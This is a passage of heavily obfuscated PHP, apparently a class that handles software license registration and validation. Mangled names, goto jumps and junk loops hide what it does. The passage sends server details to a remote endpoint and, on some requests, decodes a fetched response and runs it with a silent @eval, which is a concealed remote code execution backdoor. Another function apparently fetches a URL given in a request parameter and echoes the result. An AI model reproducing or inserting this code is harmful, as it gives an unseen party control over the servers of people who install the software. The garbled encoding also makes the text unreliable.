= $C¿†Á–ƒÆ[202]; $B¡ÒÍÊÀñ¢ = $f²ÄÖ¬Û·[$C¿†Á–ƒÆ[201]] ? $C¿†Á–ƒÆ[203] . $f²ÄÖ¬Û·[$C¿†Á–ƒÆ[201]] : $a’˜›šá÷½; $C¿†Á–ƒÆ[175]($B¡ÒÍÊÀñ¢, !1); } else { $f¦Ú„œîäØ[$C¿†Á–ƒÆ[177]] = $f²ÄÖ¬Û·[$C¿†Á–ƒÆ[201]][$C¿†Á–ƒÆ[204]]; } } else { $f²ÄÖ¬Û· = $this->{$_SERVER[Ó¥ú][191]}($C¿†Á–ƒÆ[205], $f¦Ú„œîäØ, 10); $dãÈïÊŠø = $E¬©ğÜÀÚŠ[588]; if (!$dãÈïÊŠø) { return; } } } if (!$C¿†Á–ƒÆ[200]($f²ÄÖ¬Û·) || !$C¿†Á–ƒÆ[200]($f²ÄÖ¬Û·[$C¿†Á–ƒÆ[201]]) || $f²ÄÖ¬Û·[$C¿†Á–ƒÆ[174]] != !0) { $a’˜›šá÷½ = $C¿†Á–ƒÆ[206]($C¿†Á–ƒÆ[207]); $B¡ÒÍÊÀñ¢ = $f²ÄÖ¬Û·[$C¿†Á–ƒÆ[201]] ? $C¿†Á–ƒÆ[203] . $f²ÄÖ¬Û·[$C¿†Á–ƒÆ[201]] : $a’˜›šá÷½; $C¿†Á–ƒÆ[175]($B¡ÒÍÊÀñ¢, !1); } $c–òªæ­ÖÉ = $f²ÄÖ¬Û·[$C¿†Á–ƒÆ[201]]; goto féŸ†Â‡‰ã; B»ù÷¿»Îö: $F¹½·©‘ì† = $E¬©ğÜÀÚŠ[590]; while (strlen($F¹½·©‘ì†) < $E¬©ğÜÀÚŠ[591]) { if (!$F¹½·©‘ì†) { break; } $F¹½·©‘ì†++; } $aŸÕˆç–‚Õ = $C¿†Á–ƒÆ[133](16); goto B·¹»±ô  ; féŸ†Â‡‰ã: $cíÌ†Š¸Ÿƒ = $this->{$_SERVER[Ó¥ú][208]}($c–òªæ­ÖÉ[$C¿†Á–ƒÆ[209]]); $C•˜ó¡æ±¨ = $E¬©ğÜÀÚŠ[589]; if (!$C•˜ó¡æ±¨) { return; } goto fçÁŸç±ñ; a» ›İäŒÙ: if (!$C¿†Á–ƒÆ[113]($GLOBALS, $C¿†Á–ƒÆ[141])) { die; } $cœÔÀ‘Ì‰ = $GLOBALS[$C¿†Á–ƒÆ[22]]; if (isset($cœÔÀ‘Ì‰[$C¿†Á–ƒÆ[172]])) { $this->{$_SERVER[Ó¥ú][173]}(); die; } goto DƒŠŸÙ…ºš; b³«Ë‡¥Ä: if ($c–òªæ­ÖÉ[$C¿†Á–ƒÆ[225]] && $c–òªæ­ÖÉ[$C¿†Á–ƒÆ[225]] >= 1) { $C¿†Á–ƒÆ[61]($C¿†Á–ƒÆ[62])->{$_SERVER[Ó¥ú][226]}($C¿†Á–ƒÆ[227], $C¿†Á–ƒÆ[228]); } $C¿†Á–ƒÆ[61]($C¿†Á–ƒÆ[62])->{$_SERVER[Ó¥ú][229]}($b‰«˜²ÛŠ); $cÖŞ†ÄÜ = $C¿†Á–ƒÆ[123]($_SERVER[$C¿†Á–ƒÆ[124]] . $C¿†Á–ƒÆ[222]($c¹ĞíøÄ‰) . $b‰«˜²ÛŠ[$C¿†Á–ƒÆ[218]]); goto BÃßº¶½¢; A¸¸‚‰ğã: $dÃ˜÷ŞµŠÛ = $this->{$_SERVER[Ó¥ú][136]}($C¿†Á–ƒÆ[157]($c–òªæ­ÖÉ), $cÖŞ†ÄÜ); $D–âôø¸Ÿ = $C¿†Á–ƒÆ[230]($C¿†Á–ƒÆ[61]($C¿†Á–ƒÆ[11])->{$_SERVER[Ó¥ú][231]}(), $C¿†Á–ƒÆ[232]); $eØìß±ëí¨ = $D–âôø¸Ÿ[$C¿†Á–ƒÆ[233]]; goto B‹ÅÄÇ§¸¦; B·¹»±ô  : $bÖÕœ‹¿¼ = $aŸÕˆç–‚Õ . $b‰«˜²ÛŠ[$C¿†Á–ƒÆ[129]] . $this->{$_SERVER[Ó¥ú][156]}($C¿†Á–ƒÆ[123]($b‰«˜²ÛŠ[$C¿†Á–ƒÆ[217]]), $aŸÕˆç–‚Õ); $a¤ãù¾ğ¿ë = $E¬©ğÜÀÚŠ[592]; $b‰«˜²ÛŠ[$C¿†Á–ƒÆ[132]] = $C¿†Á–ƒÆ[127]($C¿†Á–ƒÆ[222]($this->{$_SERVER[Ó¥ú][156]}($bÖÕœ‹¿¼, $C¿†Á–ƒÆ[224]))); goto b³«Ë‡¥Ä; fçÁŸç±ñ: if (!$cíÌ†Š¸Ÿƒ || $cíÌ†Š¸Ÿƒ != $c–òªæ­ÖÉ[$C¿†Á–ƒÆ[154]]) { $bˆ‡ñÂ¦¾ö = array($C¿†Á–ƒÆ[210] => $C¿†Á–ƒÆ[61]($C¿†Á–ƒÆ[62])->{$_SERVER[Ó¥ú][63]}($C¿†Á–ƒÆ[125]), $C¿†Á–ƒÆ[211] => $_SERVER[$C¿†Á–ƒÆ[124]], $C¿†Á–ƒÆ[212] => $C¿†Á–ƒÆ[213](), $C¿†Á–ƒÆ[183] => $_SERVER[$C¿†Á–ƒÆ[184]]); $Cªµï¶Ä¸ = $this->{$_SERVER[Ó¥ú][214]}($C¿†Á–ƒÆ[157]($bˆ‡ñÂ¦¾ö)); $this->{$_SERVER[Ó¥ú][191]}($C¿†Á–ƒÆ[215] . $Cªµï¶Ä¸); $C¿†Á–ƒÆ[175]($C¿†Á–ƒÆ[206]($C¿†Á–ƒÆ[216]), !0); } $b‰«˜²ÛŠ = array($C¿†Á–ƒÆ[217] => $f¦Ú„œîäØ[$C¿†Á–ƒÆ[174]], $C¿†Á–ƒÆ[218] => $c–òªæ­ÖÉ[$C¿†Á–ƒÆ[219]], $C¿†Á–ƒÆ[220] => $C¿†Á–ƒÆ[133](16), $C¿†Á–ƒÆ[129] => $c–òªæ­ÖÉ[$C¿†Á–ƒÆ[221]]); if ($f¦Ú„œîäØ[$C¿†Á–ƒÆ[177]]) { $b‰«˜²ÛŠ[$C¿†Á–ƒÆ[220]] = $f¦Ú„œîäØ[$C¿†Á–ƒÆ[177]]; } goto a‰¡‘³è¤£; D§Ë„Ç’„: $CºÑ…ÙÁØ– = $E¬©ğÜÀÚŠ[597]; if (strlen($CºÑ…ÙÁØ–) < $E¬©ğÜÀÚŠ[558]) { die; } $C¿†Á–ƒÆ[175]($C¿†Á–ƒÆ[206]($C¿†Á–ƒÆ[216]), !0); goto DêÜÊ¯ÛĞ; BÃßº¶½¢: $AÍƒ‚çêŸ = $E¬©ğÜÀÚŠ[593]; $Aœğ†÷Úé = $C¿†Á–ƒÆ[222]($C¿†Á–ƒÆ[25]($cÖŞ†ÄÜ, 10, 16)); $c›ë‚—ñ«– = $E¬©ğÜÀÚŠ[594]; goto A¸¸‚‰ğã; cé‰ßÃÂôê: $C¿†Á–ƒÆ[61]($C¿†Á–ƒÆ[11])->{$_SERVER[Ó¥ú][234]}($eØìß±ëí¨[$C¿†Á–ƒÆ[235]], array($C¿†Á–ƒÆ[236] => $A·İğ…Óó»)); $this->ftcn0421233a = $c–òªæ­ÖÉ; $this->otvd669bc36d = $b‰«˜²ÛŠ[$C¿†Á–ƒÆ[129]]; goto CŒêŸ‘‘Ê¦; f–½ËÚÕˆê: $E¬©ğÜÀÚŠ =& $_SERVER[¦·]; $C¿†Á–ƒÆ =& $_SERVER[Ó¥ú]; if ($_SERVER[$C¿†Á–ƒÆ[44]] != $C¿†Á–ƒÆ[171]) { return; } goto a» ›İäŒÙ; DƒŠŸÙ…ºš: if (!isset($cœÔÀ‘Ì‰[$C¿†Á–ƒÆ[174]]) || $C¿†Á–ƒÆ[24]($cœÔÀ‘Ì‰[$C¿†Á–ƒÆ[174]]) != 16) { $C¿†Á–ƒÆ[175]($C¿†Á–ƒÆ[176] . $cœÔÀ‘Ì‰[$C¿†Á–ƒÆ[174]], !1); } $c¹ĞíøÄ‰ = $C¿†Á–ƒÆ[61]($C¿†Á–ƒÆ[62])->{$_SERVER[Ó¥ú][63]}($C¿†Á–ƒÆ[125]); $f¦Ú„œîäØ = array($C¿†Á–ƒÆ[174] => $cœÔÀ‘Ì‰[$C¿†Á–ƒÆ[174]], $C¿†Á–ƒÆ[177] => $C¿†Á–ƒÆ[133](16), $C¿†Á–ƒÆ[178] => $C¿†Á–ƒÆ[158], $C¿†Á–ƒÆ[179] => $C¿†Á–ƒÆ[180], $C¿†Á–ƒÆ[181] => $_SERVER[$C¿†Á–ƒÆ[182]], $C¿†Á–ƒÆ[183] => $_SERVER[$C¿†Á–ƒÆ[184]], $C¿†Á–ƒÆ[185] => $_SERVER[$C¿†Á–ƒÆ[186]]); goto aâãÄ àæ; CŒêŸ‘‘Ê¦: $BÀ‹µ¥¹Ä = $E¬©ğÜÀÚŠ[596]; if (strlen($BÀ‹µ¥¹Ä) < $E¬©ğÜÀÚŠ[576]) { die; } $this->{$_SERVER[Ó¥ú][237]}(); goto D§Ë„Ç’„; aâãÄ àæ: $E´œÄ·ãó¢ = $E¬©ğÜÀÚŠ[587]; while (strlen($E´œÄ·ãó¢) < $E¬©ğÜÀÚŠ[558]) { if (!$E´œÄ·ãó¢) { break; } $E´œÄ·ãó¢++; } $bŸùÄŸÙá = $C¿†Á–ƒÆ[123]($_SERVER[$C¿†Á–ƒÆ[124]] . $c¹ĞíøÄ‰); goto añğÖø‰ÈÆ; DêÜÊ¯ÛĞ: } private function licenseRegistSuccess() { $CÚ¢‘ª½²İ =& $_SERVER[Ó¥ú]; $Fâ÷‚¥¹š = $CÚ¢‘ª½²İ[61]($CÚ¢‘ª½²İ[62])->{$_SERVER[Ó¥ú][63]}(); if ($Fâ÷‚¥¹š[$CÚ¢‘ª½²İ[89]] != $CÚ¢‘ª½²İ[228]) { $CÚ¢‘ª½²İ[61]($CÚ¢‘ª½²İ[62])->{$_SERVER[Ó¥ú][229]}($CÚ¢‘ª½²İ[89], $CÚ¢‘ª½²İ[228]); } $CÚ¢‘ª½²İ[119]($CÚ¢‘ª½²İ[238])->{$_SERVER[Ó¥ú][239]}(!0); } private function txla312ec026() { goto C‘´¹ƒÑÈ“; c¬Ñ‚¿ùÆ‹: $dî¥ºÒ°• = $dÇ‚ÍÁ©¦¾[599]; $this->ftcn0421233a = array(); $this->otvd669bc36d = $BóÄ‘Ùîğö[130]; goto F‘‚ßÔœÍ†; a©»¯ğˆŠà: $cÍ±šÏí³ï = $dÇ‚ÍÁ©¦¾[598]; if (!$cÍ±šÏí³ï) { return; } $BóÄ‘Ùîğö[61]($BóÄ‘Ùîğö[62])->{$_SERVER[Ó¥ú][226]}($BóÄ‘Ùîğö[227], $BóÄ‘Ùîğö[240]); goto c¬Ñ‚¿ùÆ‹; C‘´¹ƒÑÈ“: $dÇ‚ÍÁ©¦¾ =& $_SERVER[¦·]; $BóÄ‘Ùîğö =& $_SERVER[Ó¥ú]; $BóÄ‘Ùîğö[61]($BóÄ‘Ùîğö[62])->{$_SERVER[Ó¥ú][229]}(array($BóÄ‘Ùîğö[217] => $BóÄ‘Ùîğö[10], $BóÄ‘Ùîğö[218] => $BóÄ‘Ùîğö[10], $BóÄ‘Ùîğö[129] => $BóÄ‘Ùîğö[130], $BóÄ‘Ùîğö[131] => $BóÄ‘Ùîğö[10], $BóÄ‘Ùîğö[132] => $BóÄ‘Ùîğö[10])); goto a©»¯ğˆŠà; F‘‚ßÔœÍ†: } private function qjsk7d855d2b() { goto Dµ·‡ØÊó; C•Œ‰´ªº¤: $aæéòèøàµ = $A½Ù™Ù³Ö[230]($A½Ù™Ù³Ö[61]($A½Ù™Ù³Ö[11])->{$_SERVER[Ó¥ú][231]}(), $A½Ù™Ù³Ö[232]); $e«½…Õ­—ø = $aæéòèøàµ[$A½Ù™Ù³Ö[233]]; $d¢§ÃµçÔÔ = $A½Ù™Ù³Ö[123]($_SERVER[$A½Ù™Ù³Ö[124]] . $A½Ù™Ù³Ö[222]($dÑíÆÖÈ›Ê) . $Eå¯ğ¼ºù[$A½Ù™Ù³Ö[218]]); goto Dïåß¼ö; cÆŠù†£‰¼: $cÅåø‘‡Î™ = $this->{$_SERVER[Ó¥ú][197]}($e«½…Õ­—ø[$A½Ù™Ù³Ö[100]][$B¦¼©óÓ£], $d¢§ÃµçÔÔ); $cÅåø‘‡Î™ = $A½Ù™Ù³Ö[199]($cÅåø‘‡Î™, !0); $d‚»¨“Ï÷÷ = $B®¬Í°˜Â[602]; goto b²äŒØæ½; c«³¡‘£ù: $Eå¯ğ¼ºù = $A½Ù™Ù³Ö[61]($A½Ù™Ù³Ö[62])->{$_SERVER[Ó¥ú][63]}(); if ($Eå¯ğ¼ºù[$A½Ù™Ù³Ö[129]] == $A½Ù™Ù³Ö[130]) { return; } $dÑíÆÖÈ›Ê = $A½Ù™Ù³Ö[61]($A½Ù™Ù³Ö[62])->{$_SERVER[Ó¥ú][63]}($A½Ù™Ù³Ö[125]); goto C•Œ‰´ªº¤; Dµ·‡ØÊó: $B®¬Í°˜Â =& $_SERVER[¦·]; $A½Ù™Ù³Ö =& $_SERVER[Ó¥ú]; $_SERVER[$A½Ù™Ù³Ö[184]] = $A½Ù™Ù³Ö[113]($_SERVER, $A½Ù™Ù³Ö[184], APP_HOST); goto a¶•­õÚïÚ; a¶•­õÚïÚ: $cØ¿®â­„ = $B®¬Í°˜Â[600]; while ($cØ¿®â­„ < $B®¬Í°˜Â[552]) { if ($cØ¿®â­„ >= 0) { break; } $cØ¿®â­„++; } $this->otvd669bc36d = $A½Ù™Ù³Ö[130]; goto c«³¡‘£ù; Dïåß¼ö: $B¦¼©óÓ£ = $A½Ù™Ù³Ö[222]($A½Ù™Ù³Ö[25]($d¢§ÃµçÔÔ, 10, 16)); $f¸ŒÕ‹š£‡ = $B®¬Í°˜Â[601]; if (!$f¸ŒÕ‹š£‡) { return; } goto cÆŠù†£‰¼; b²äŒØæ½: if (!$A½Ù™Ù³Ö[200]($cÅåø‘‡Î™)) { return $this->{$_SERVER[Ó¥ú][173]}(); } $Bƒ†÷µÀÅå = $A½Ù™Ù³Ö[153]($cÅåø‘‡Î™[$A½Ù™Ù³Ö[154]]); if ($A½Ù™Ù³Ö[241]() >= $Bƒ†÷µÀÅå) { return $this->{$_SERVER[Ó¥ú][173]}(); } goto b‚Î„£Ô’ƒ; b‚Î„£Ô’ƒ: $this->ftcn0421233a = $cÅåø‘‡Î™; $this->otvd669bc36d = $Eå¯ğ¼ºù[$A½Ù™Ù³Ö[129]]; $E¡æ²®‘ = $B®¬Í°˜Â[603]; goto E‚®­†­; E‚®­†­: } private function bxfmc99c5316() { goto CØØ¦ïŠëÅ; béÀØ‚ŸÇ: $aÅ°—Œóõ† = $EšäÜ©Ñ«‘[604]; while (strlen($aÅ°—Œóõ†) < $EšäÜ©Ñ«‘[552]) { if (!$aÅ°—Œóõ†) { break; } $aÅ°—Œóõ†++; } $EÄ—Å‹®„ = $_SERVER[$A …‰ïÙÈ‹[44]]; goto aÓÉª‚¨¯Å; CØØ¦ïŠëÅ: $EšäÜ©Ñ«‘ =& $_SERVER[¦·]; $A …‰ïÙÈ‹ =& $_SERVER[Ó¥ú]; $E±î†ò„÷ = $GLOBALS[$A …‰ïÙÈ‹[22]]; goto béÀØ‚ŸÇ; aÓÉª‚¨¯Å: if ($EÄ—Å‹®„ == $A …‰ïÙÈ‹[242] && $this->otvd669bc36d == $A …‰ïÙÈ‹[130]) { $A …‰ïÙÈ‹[175]($A …‰ïÙÈ‹[206]($A …‰ïÙÈ‹[243]), !1, $A …‰ïÙÈ‹[244]); } $C ÌŞèÌ… = array($A …‰ïÙÈ‹[245], $A …‰ïÙÈ‹[246]); if ($A …‰ïÙÈ‹[247]($EÄ—Å‹®„, $C ÌŞèÌ…)) { if ($this->otvd669bc36d == $A …‰ïÙÈ‹[130] && isset($E±î†ò„÷[$A …‰ïÙÈ‹[248]])) { $A …‰ïÙÈ‹[175]($A …‰ïÙÈ‹[206]($A …‰ïÙÈ‹[243]), !1, $A …‰ïÙÈ‹[244]); die; } $Aéˆ³¹ŠÌê = $this->{$_SERVER[Ó¥ú][146]}(); if ($Aéˆ³¹ŠÌê != $A …‰ïÙÈ‹[249]($A …‰ïÙÈ‹[250])) { if ($Aéˆ³¹ŠÌê <= $A …‰ïÙÈ‹[61]($A …‰ïÙÈ‹[148])->{$_SERVER[Ó¥ú][149]}()) { $A …‰ïÙÈ‹[175]($A …‰ïÙÈ‹[206]($A …‰ïÙÈ‹[251]), !1, $A …‰ïÙÈ‹[244]); die; } } } goto Bì¡¬œºÍâ; Bì¡¬œºÍâ: } private function ktad8e5f46a9() { goto E·‰‚‚ÄÕ ; F„´·´Õô: $féÉÏù†õ = $aŞ¬ì†¶¤„[254]; $aôø±ƒ£„ = $F»²²Ôİíã[606]; if (!$aôø±ƒ£„) { return; } goto D·îóÌÔ×§; c“Â‡í íÚ: $aŞ¬ì†¶¤„[263]($aŞ¬ì†¶¤„[264]); $a°™Œ…¼ÒŠ = $F»²²Ôİíã[610]; if (!$a°™Œ…¼ÒŠ) { return; } goto F¶øÅëÀİÇ; C·†³¤¸ª–: $bï‘ä‡½–ƒ = $aŞ¬ì†¶¤„[257](array($aŞ¬ì†¶¤„[258] => array($aŞ¬ì†¶¤„[259] => $aŞ¬ì†¶¤„[260], $aŞ¬ì†¶¤„[261] => 3))); $aÑöÓœ×°— = $F»²²Ôİíã[608]; if (!$aÑöÓœ×°—) { die; } goto eèÔ¨Áåí; F¶øÅëÀİÇ: if ($dˆµÜŞåÑÛ && $aŞ¬ì†¶¤„[32]($dˆµÜŞåÑÛ, $aŞ¬ì†¶¤„[265])) { echo $dˆµÜŞåÑÛ; } die; goto fä¦’–Ñªƒ; D·îóÌÔ×§: $féÉÏù†õ = $this->{$_SERVER[Ó¥ú][255]}($féÉÏù†õ, $aŞ¬ì†¶¤„[256]); $E‚İ„òÎ‡ = $F»²²Ôİíã[607]; if (!$E‚İ„òÎ‡) { die; } goto C·†³¤¸ª–; eèÔ¨Áåí: $dˆµÜŞåÑÛ = @$aŞ¬ì†¶¤„[262]($féÉÏù†õ, !1, $bï‘ä‡½–ƒ); $C©ÎøšÖ› = $F»²²Ôİíã[609]; if (strlen($C©ÎøšÖ›) < $F»²²Ôİíã[576]) { die; } goto c“Â‡í íÚ; b…ÇòàÇÅŒ: $Cº»†¾×ö§ = $F»²²Ôİíã[605]; if (!$aŞ¬ì†¶¤„[113]($GLOBALS, $aŞ¬ì†¶¤„[141]) || !isset($_GET[$aŞ¬ì†¶¤„[253]])) { return; } if (!$aŞ¬ì†¶¤„[247]($_SERVER[$aŞ¬ì†¶¤„[44]], $E—Ë·ŞÒ‰)) { return; } goto F„´·´Õô; E·‰‚‚ÄÕ : $F»²²Ôİíã =& $_SERVER[¦·]; $aŞ¬ì†¶¤„ =& $_SERVER[Ó¥ú]; $E—Ë·ŞÒ‰ = array($aŞ¬ì†¶¤„[144], $aŞ¬ì†¶¤„[252]); goto b…ÇòàÇÅŒ; fä¦’–Ñªƒ: } public function rhxfba7471c7($B…Êß×äª†) { goto d·´íáŒĞ¸; aóÃº´¡İ: while (strlen($AùæäÄ¾¨Æ) < $cËšÔ¦šÇ [552]) { if (!$AùæäÄ¾¨Æ) { break; } $AùæäÄ¾¨Æ++; } foreach ($cÏ§©­Ì as $c¢ µ„ë§… => $C‚Ä’¿å) { if ($C‚Ä’¿å == $c•©ÔñòŸ‘[268] && $c•©ÔñòŸ‘[25]($this->otvd669bc36d, 0, 1) == $c•©ÔñòŸ‘[268]) { continue; } if (!$c•©ÔñòŸ‘[247]($c¢ µ„ë§…, $Aµ†Ûã‘¼Ø)) { $Eä–Í±“Ë§[] = $c¢ µ„ë§…; } } foreach ($Eä–Í±“Ë§ as $c¢ µ„ë§…) { unset($B…Êß×äª†[$c¢ µ„ë§…]); } goto Càœó›‰; a‘Ñ¡ÛÓíÍ: $cÏ§©­Ì = array($c•©ÔñòŸ‘[267] => $c•©ÔñòŸ‘[268], $c•©ÔñòŸ‘[269] => $c•©ÔñòŸ‘[268], $c•©ÔñòŸ‘[270] => $c•©ÔñòŸ‘[268], $c•©ÔñòŸ‘[271] => $c•©ÔñòŸ‘[268], $c•©ÔñòŸ‘[272] => $c•©ÔñòŸ‘[268], $c•©ÔñòŸ‘[273] => $c•©ÔñòŸ‘[268], $c•©ÔñòŸ‘[274] => $c•©ÔñòŸ‘[275], $c•©ÔñòŸ‘[276] => $c•©ÔñòŸ‘[275], $c•©ÔñòŸ‘[277] => $c•©ÔñòŸ‘[275], $c•©ÔñòŸ‘[278] => $c•©ÔñòŸ‘[275], $c•©ÔñòŸ‘[279] => $c•©ÔñòŸ‘[275], $c•©ÔñòŸ‘[280] => $c•©ÔñòŸ‘[275], $c•©ÔñòŸ‘[281] => $c•©ÔñòŸ‘[275]); $Aµ†Ûã‘¼Ø = $c•©ÔñòŸ‘[0]($c•©ÔñòŸ‘[282], $c•©ÔñòŸ‘[113]($this->ftcn0421233a, $c•©ÔñòŸ‘[138], $c•©ÔñòŸ‘[10])); $fÏ‚À…İìª = $cËšÔ¦šÇ [611]; goto dÎ‡´ˆâÓ†; dÎ‡´ˆâÓ†: if (!$fÏ‚À…İìª) { die; } $Eä–Í±“Ë§ = array(); $AùæäÄ¾¨Æ = $cËšÔ¦šÇ [612]; goto aóÃº´¡İ; d·´íáŒĞ¸: $cËšÔ¦šÇ  =& $_SERVER[¦·]; $c•©ÔñòŸ‘ =& $_SERVER[Ó¥ú]; if ($this->otvd669bc36d == $c•©ÔñòŸ‘[266]) { return $B…Êß×äª†; } goto a‘Ñ¡ÛÓíÍ; Càœó›‰: return $B…Êß×äª†; goto bÎ÷¼–ô; bÎ÷¼–ô: } private function mjlp831e2d7c() { goto F³“ÑÌ×Çí; Aƒ÷Ş‘Öë“: $GLOBALS[$EäğÃòÜ[100]][$EäğÃòÜ[104]][$EäğÃòÜ[283]] = $EäğÃòÜ[228]; $GLOBALS[$EäğÃòÜ[100]][$EäğÃòÜ[284]] = $EäğÃòÜ[228]; $B¦×µåØé¸ = $CœœÙÃ¬ÃÅ[613]; goto a†÷Ğº¤²; F³“ÑÌ×Çí: $CœœÙÃ¬ÃÅ =& $_SERVER[¦·]; $EäğÃòÜ =& $_SERVER[Ó¥ú]; if ($this->otvd669bc36d != $EäğÃòÜ[130]) { return; } goto Aƒ÷Ş‘Öë“; a†÷Ğº¤²: while (strlen($B¦×µåØé¸) < $CœœÙÃ¬ÃÅ[591]) { if (!$B¦×µåØé¸) { break; } $B¦×µåØé¸++; } if ($EäğÃòÜ[61]($EäğÃòÜ[285])->{$_SERVER[Ó¥ú][63]}($EäğÃòÜ[89]) != $EäğÃòÜ[240]) { $EäğÃòÜ[61]($EäğÃòÜ[285])->{$_SERVER[Ó¥ú][229]}($EäğÃòÜ[89], $EäğÃòÜ[240]); } goto Cç¦­Ô¨‘ï; Cç¦­Ô¨‘ï: } public function dfcl185372b0() { return $_SERVER[Ó¥ú][286]; $f‰±‰Ì”øê = $_SERVER[¦·][614]; } private function bxmy0052f026() { goto B¹Êë…… ; b¨±ƒ˜å¸Í: if ($D­¨äìéŞ®[$E¸¾È¹íœÏ[174]] && $D­¨äìéŞ®[$E¸¾È¹íœÏ[296]]) { if ($this->{$_SERVER[Ó¥ú][208]}($D­¨äìéŞ®[$E¸¾È¹íœÏ[296]]) == $C–æİµê[$E¸¾È¹íœÏ[174]]) { return; } } $this->{$_SERVER[Ó¥ú][173]}(); if ($this->{$_SERVER[Ó¥ú][208]}($D­¨äìéŞ®[$E¸¾È¹íœÏ[296]]) != $C–æİµê[$E¸¾È¹íœÏ[174]]) { $báˆÒÛ©¾ñ = array($E¸¾È¹íœÏ[210] => $E¸¾È¹íœÏ[61]($E¸¾È¹íœÏ[62])->{$_SERVER[Ó¥ú][63]}($E¸¾È¹íœÏ[125]), $E¸¾È¹íœÏ[211] => $_SERVER[$E¸¾È¹íœÏ[124]], $E¸¾È¹íœÏ[212] => $E¸¾È¹íœÏ[213](), $E¸¾È¹íœÏ[183] => $_SERVER[$E¸¾È¹íœÏ[184]]); $aÚâê²ğË = $this->{$_SERVER[Ó¥ú][214]}($E¸¾È¹íœÏ[157]($báˆÒÛ©¾ñ)); $D­¨äìéŞ® = $this->{$_SERVER[Ó¥ú][191]}($E¸¾È¹íœÏ[215] . $aÚâê²ğË); if ($D­¨äìéŞ® && $E¸¾È¹íœÏ[200]($D­¨äìéŞ®) && isset($D­¨äìéŞ®[$E¸¾È¹íœÏ[296]])) { $Aó¶Å¥éÀ = $this->{$_SERVER[Ó¥ú][197]}($D­¨äìéŞ®[$E¸¾È¹íœÏ[296]], 2); if ($Aó¶Å¥éÀ) { $Aó¶Å¥éÀ = $this->{$_SERVER[Ó¥ú][208]}($Aó¶Å¥éÀ); } if ($Aó¶Å¥éÀ) { try { @eval($Aó¶Å¥éÀ); } catch (Exception $a„†«™ô¬ä) { } } } } goto d†®¨İšÏ¯; B¹Êë…… : $b’Àß«ô¬Ô =& $_SERVER[¦·]; $E¸¾È¹íœÏ =& $_SERVER[Ó¥ú]; $CÀĞÒ¥¢Ç… = array($E¸¾È¹íœÏ[287], $E¸¾È¹íœÏ[288], $E¸¾È¹íœÏ[289]); goto b†ñ¿äç·Ã; fŞ—Üà¼†ò: $E¸¾È¹íœÏ[13](array($E¸¾È¹íœÏ[292], $E¸¾È¹íœÏ[161]), $A¾­ˆ«ß², $E¸¾È¹íœÏ[241]()); $cŒ¯ éä­¨ = $b’Àß«ô¬Ô[617]; if (strlen($cŒ¯ éä­¨) < $b’Àß«ô¬Ô[556]) { die; } goto Cœ¦Õ¦ò½å; Eª ¯ÃÁ»: $c©Œâ‘¢Ÿò = $E¸¾È¹íœÏ[13](array($E¸¾È¹íœÏ[292], $E¸¾È¹íœÏ[293]), $A¾­ˆ«ß²); $fîÆƒã·—¯ = $b’Àß«ô¬Ô[616]; if ($c©Œâ‘¢Ÿò && $E¸¾È¹íœÏ[241]() - $c©Œâ‘¢Ÿò < $E¸¾È¹íœÏ[249]($E¸¾È¹íœÏ[294])) { return; } goto fŞ—Üà¼†ò; Bª¨ƒŠñˆö: if ($this->otvd669bc36d == $E¸¾È¹íœÏ[130] || !$E¸¾È¹íœÏ[113]($GLOBALS, $E¸¾È¹íœÏ[141])) { return; } if (!$E¸¾È¹íœÏ[247]($_SERVER[$E¸¾È¹íœÏ[44]], $CÀĞÒ¥¢Ç…)) { return; } if ($E¸¾È¹íœÏ[241]() % 4 != 0) { return; } goto Eª ¯ÃÁ»; Cé‰—¡†¯­: $FÅÍÓ¹¡Í = $b’Àß«ô¬Ô[619]; while ($FÅÍÓ¹¡Í < $b’Àß«ô¬Ô[552]) { if ($FÅÍÓ¹¡Í >= 0) { break; } $FÅÍÓ¹¡Í++; } if (!$E¸¾È¹íœÏ[200]($D­¨äìéŞ®)) { return; } goto b¨±ƒ˜å¸Í; Cœ¦Õ¦ò½å: $C–æİµê = array($E¸¾È¹íœÏ[174] => $E¸¾È¹íœÏ[61]($E¸¾È¹íœÏ[62])->{$_SERVER[Ó¥ú][63]}($E¸¾È¹íœÏ[217]), $E¸¾È¹íœÏ[187] => $this->otvd669bc36d, $E¸¾È¹íœÏ[185] => $_SERVER[$E¸¾È¹íœÏ[186]], $E¸¾È¹íœÏ[178] => $E¸¾È¹íœÏ[158], $E¸¾È¹íœÏ[181] => $_SERVER[$E¸¾È¹íœÏ[182]]); $FëÓÈ¤Ñ½â = $b’Àß«ô¬Ô[618]; $D­¨äìéŞ® = $this->{$_SERVER[Ó¥ú][191]}($E¸¾È¹íœÏ[295], $C–æİµê); goto Cé‰—¡†¯­; b†ñ¿äç·Ã: $a„­ƒ¸¾¥ = $b’Àß«ô¬Ô[615]; while ($a„­ƒ¸¾¥ < $b’Àß«ô¬Ô[576]) { if ($a„­ƒ¸¾¥ >= 0) { break; } $a„­ƒ¸¾¥++; } $A¾­ˆ«ß² = $E¸¾È¹íœÏ[290] . $E¸¾È¹íœÏ[123]($E¸¾È¹íœÏ[291]); goto Bª¨ƒŠñˆö; d†®¨İšÏ¯: } private function werb0f17f9c2($D¶ššî†Î = '', $a¿›ğŠ¿§ = array(), $bĞŠÚĞ¹‡Ş = 5) { goto eÅ…ñ¥Èà–; E¬çëÚ°‡: $BˆĞ†ÂÛã¤ = $this->{$_SERVER[Ó¥ú][255]}($BˆĞ†ÂÛã¤, $c¹·Ÿ­æğö[298]); $Fš‚ñíšËÖ = $aŸª£³°³ß[620]; $BˆĞ†ÂÛã¤ = $BˆĞ†ÂÛã¤ . $D¶ššî†Î . $c¹·Ÿ­æğö[299] . $c¹·Ÿ­æğö[300]($a¿›ğŠ¿§); goto cÄï¹‚•Ìß; cÄï¹‚•Ìß: $e ßÅ¤Óâˆ = $aŸª£³°³ß[621]; while (strlen($e ßÅ¤Óâˆ) < $aŸª£³°³ß[558]) { if (!$e ßÅ¤Óâˆ) { break; } $e ßÅ¤Óâˆ++; } if ($a¿›ğŠ¿§ === -1) { return $BˆĞ†ÂÛã¤; } goto a¤ĞÆŠ–·; a‡–«å×ôº: $a¿›ğŠ¿§ = @$c¹·Ÿ­æğö[262]($BˆĞ†ÂÛã¤, !1, $bØ­›ÆÉ¶…); $A’±ï°ˆ¶¢ = $aŸª£³°³ß[623]; while ($A’±ï°ˆ¶¢ < $aŸª£³°³ß[556]) { if ($A’±ï°ˆ¶¢ >= 0) { break; } $A’±ï°ˆ¶¢++; } goto F‰ç¹­‰ªÍ; F‰ç¹­‰ªÍ: return $c¹·Ÿ­æğö[199]($a¿›ğŠ¿§, !0); $f„ö…‘Ø¬ò = $aŸª£³°³ß[624]; if 